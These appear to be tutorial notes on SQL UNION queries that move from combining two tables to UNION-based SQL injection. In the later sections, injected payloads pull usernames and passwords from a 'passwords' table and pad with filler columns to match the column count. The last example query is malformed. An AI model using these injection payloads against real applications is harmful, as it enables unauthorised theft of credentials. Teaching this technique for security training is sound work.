## Union

```sql
mysql> SELECT * FROM ports;
```

```sql
mysql> SELECT * FROM ships;
```

Now, let us try to use `UNION` to combine both results:

```sql
mysql> SELECT * FROM ports UNION SELECT * FROM ships;
```
## Even Columns

```sql
mysql> SELECT city FROM ports UNION SELECT * FROM ships;

ERROR 1222 (21000): The used SELECT statements have a different number of columns
```

```sql
SELECT * FROM products WHERE product_id = 'user_input'
```

```sql
SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '
```
## Un-even Columns

```sql
SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords
```

```sql
UNION SELECT username, 2, 3, 4 from passwords-- '
```

This query would return:

```sql
mysql> SELECT * from products where product_id UNION SELECT username, 2, 3, 4 from passwords-- '
```
